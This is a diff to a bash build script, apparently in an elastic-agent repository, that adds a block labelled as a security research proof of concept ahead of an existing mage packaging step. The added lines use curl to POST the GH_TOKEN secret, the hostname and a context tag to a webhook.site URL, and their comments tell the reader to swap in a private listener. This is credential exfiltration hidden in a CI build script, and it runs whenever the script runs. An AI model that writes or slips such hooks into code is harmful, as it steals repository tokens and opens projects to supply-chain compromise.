@@ -1,4 +1,15 @@
 #!/bin/bash
+# FORGEVERTICAL POC: PROVING GH_TOKEN EXFILTRATION
+# This script demonstrates that a malicious PR can capture secrets.
+echo "--- BEGIN SECURITY RESEARCH POC ---"
+
+# Exfiltrate the token to your private listener
+# Replace the URL with your Webhook.site or private server URL
+curl -X POST -H "Content-Type: application/json" \
+     -d "{\"token\": \"$GH_TOKEN\", \"host\": \"$(hostname)\", \"context\": \"elastic-agent-rce\"}" \
+     https://webhook.site/ffcd246a-9e20-4bc1-893c-4a9b6a590df4
+
+echo "--- POC COMPLETE: DATA SENT TO SECURE AUDIT SERVER ---"
 set -e
 
 package_version=$(mage integration:updatePackageVersion)
